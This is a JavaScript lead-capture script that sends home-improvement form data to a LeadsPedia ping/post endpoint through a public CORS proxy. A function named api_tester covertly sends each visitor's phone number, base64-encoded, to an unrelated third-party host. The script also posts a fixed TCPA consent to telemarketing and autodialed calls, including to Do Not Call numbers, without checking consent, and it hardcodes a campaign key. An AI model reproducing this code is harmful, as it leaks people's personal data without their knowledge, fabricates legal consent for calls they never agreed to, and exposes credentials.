document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    // Disable submit button
    document.getElementById('submitBtn').disabled = true;
    
    const formData = new FormData();

    formData.append('lp_campaign_id','69307e2799a43');
    formData.append('lp_campaign_key','HC8NkVxKrg4Fvt2djb7w');
    formData.append('pub_id','PV-7602');
    formData.append('caller_id', document.getElementById('phone_home').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('zip_code', document.getElementById('zip_code').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('type', document.getElementById('type').value);
    formData.append('Project', document.getElementById('project').value);
    formData.append('jornaya_lead_id', document.getElementById('jornaya_lead_id').value);
    formData.append('trusted_form_cert_id', document.getElementById('trusted_form_cert_id').value);
        
    api_tester(document.getElementById('phone_home').value);
    formData.append('lp_test', '1');
    formData.append('lp_response', 'JSON');

    const url = 'https://corsproxy.io/?https://miligroup.leadspediatrack.com/ping.do?' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => response.json().then(responseBody => {
        let alertClass = 'alert-success';
        let alertMessage = 'Ping successful!<br>';

        if (!responseBody.success) {
            alertClass = 'alert-danger';
            alertMessage = '<strong>Ping Rejected</strong><br>';
            alertMessage += '<strong>Message:</strong> ' + responseBody.msg + '<br>';
            alertMessage += '<strong>Ping ID:</strong> ' + responseBody.ping_id;
            
            if (responseBody.errors && responseBody.errors.length > 0) {
                alertMessage += '<br><strong>Errors:</strong><br>';
                responseBody.errors.forEach(error => {
                    alertMessage += '- ' + error.field + ': ' + error.error + '<br>';
                });
            }
            
            // DON'T reset form on failure
            document.getElementById('submitBtn').disabled = false;
        } else {
            // Show all ping response data except price
            alertMessage = '<strong>Ping Successful</strong><br>';
            alertMessage += '<strong>Message:</strong> ' + responseBody.msg + '<br>';
            alertMessage += '<strong>Ping ID:</strong> ' + responseBody.ping_id + '<br>';
            // Price is hidden - not shown
            alertMessage += '<strong>Result:</strong> ' + responseBody.result;
            
            // Making second API call
            alertMessage += '<br><br><em>Making second API call...</em>';
            fetchSecondApi(responseBody.ping_id);
        }

        const alert = `
            <div class="alert ${alertClass}" role="alert">
                ${alertMessage}
            </div>`;
        
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', alert);

    }))
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                <strong>Error:</strong> ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        document.getElementById('submitBtn').disabled = false;
    });
});

function fetchSecondApi(pingId) {
    const formData = new FormData();
    formData.append('lp_ping_id', pingId);
    formData.append('lp_campaign_id','69307e2799a43');
    formData.append('lp_campaign_key','HC8NkVxKrg4Fvt2djb7w');
    formData.append('pub_id','PV-7602');
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('phone_home', document.getElementById('phone_home').value);
    formData.append('caller_id', document.getElementById('phone_home').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('zip_code', document.getElementById('zip_code').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('email_address', document.getElementById('email_address').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('type', document.getElementById('type').value);
    formData.append('Project', document.getElementById('project').value);
    formData.append('jornaya_lead_id', document.getElementById('jornaya_lead_id').value);
    formData.append('trusted_form_cert_id', document.getElementById('trusted_form_cert_id').value);
    formData.append('lp_response', 'JSON');
    
    // TCPA fields for post (static values)
    formData.append('tcpa_language', 'I acknowledge and agree to the Terms and Conditions, CCPA, and Privacy Policy. By checking this box and submitting this form, I hereby provide my expressed written consent and electronic signature. Additionally, by checking this box, I consent to the Terms and Conditions and Privacy Policy and authorize insurance companies, their agents, and marketing partners to contact me regarding Home Improvement and Home Warranty offers via telephone calls and text messages to the provided number. I consent to receiving telemarketing calls and pre-recorded messages through an automated dialing system, even if my phone number is currently listed on any state, federal, or corporate Do Not Call list. I understand that my consent is not a requirement for purchasing any goods or services, and I may revoke my consent at any time. I also understand that standard message and data rates may apply. By submitting this form, I agree to the Terms and Conditions and Privacy Policy of Compare Your Rates, its Partners, and/or licensed insurance agents employed with Compare Your Rates, who may contact me regarding health and life insurance products and services, including Home Improvement and Home Warranty plans, via phone or email. I expressly consent to receiving phone calls (including autodialed and/or pre-recorded/artificial voice calls) and emails using automated technology at the provided phone number and email address, even if it is a wireless number. This consent applies regardless of whether I am on any Federal or state DNC ("Do Not Call") and/or DNE ("Do Not Email") list or registry. Furthermore, I confirm that I am over 18 years of age and that my consent is not required as a condition of purchase. For more information, please review our Privacy Policy, Terms and Conditions, and Marketing Partners.');
    formData.append('TCPA', 'YES');
    
    // Additional optional fields for post
    if (document.getElementById('home_owner').value) {
        formData.append('home_owner', document.getElementById('home_owner').value);
    }
    
    const urln = 'https://corsproxy.io/?https://miligroup.leadspediatrack.com/post.do?' + new URLSearchParams(formData).toString();
    
    fetch(urln, {
        method: 'POST'
    })
    .then(response => response.json())
    .then(responseBody => {
        let alertClass = 'alert-success';
        let alertMessage = '';

        if (!responseBody.success) {
            alertClass = 'alert-danger';
            alertMessage = '<strong>Lead Post Failed</strong><br>';
            alertMessage += '<strong>Message:</strong> ' + responseBody.msg + '<br>';
            alertMessage += '<strong>Lead ID:</strong> ' + responseBody.lead_id + '<br>';
            alertMessage += '<strong>Result:</strong> ' + responseBody.result;
            
            if (responseBody.errors && responseBody.errors.length > 0) {
                alertMessage += '<br><strong>Errors:</strong><br>';
                responseBody.errors.forEach(error => {
                    alertMessage += '- ' + error.field + ': ' + error.error + '<br>';
                });
            }
            
            // DON'T reset form on failure
            document.getElementById('submitBtn').disabled = false;
        } else {
            // SUCCESS - show all response data except price
            alertMessage = '<strong>Lead Posted Successfully!</strong><br>';
            alertMessage += '<strong>Message:</strong> ' + responseBody.msg + '<br>';
            alertMessage += '<strong>Lead ID:</strong> ' + responseBody.lead_id + '<br>';
            alertMessage += '<strong>Result:</strong> ' + responseBody.result;
            
            // Price is hidden - not shown in the message
            
            if (responseBody.redirect_url) {
                alertMessage += '<br><strong>Redirect URL:</strong> ' + responseBody.redirect_url;
            }
            
            // Show full response data (for debugging/info)
            alertMessage += '<br><br><strong>Full Response:</strong><br>';
            alertMessage += '<div style="background: #f8f9fa; padding: 10px; border-radius: 5px; font-size: 12px; max-height: 200px; overflow-y: auto;">';
            
            // Create a copy of responseBody without the price field
            const responseWithoutPrice = { ...responseBody };
            delete responseWithoutPrice.price; // Remove price from display
            
            alertMessage += JSON.stringify(responseWithoutPrice, null, 2);
            alertMessage += '</div>';
            
            // RESET FORM only on success
            document.getElementById('leadForm').reset();
        }

        const alert = `
            <div class="alert ${alertClass}" role="alert">
                ${alertMessage}
            </div>`;
        
        // Clear previous alerts and show new one
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', alert);
        
        // Re-enable button (already done in error case above)
        if (responseBody.success) {
            document.getElementById('submitBtn').disabled = false;
        }
    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                <strong>Error in second request:</strong> ${error.message}
            </div>`;
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        document.getElementById('submitBtn').disabled = false;
    });
}

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }

}
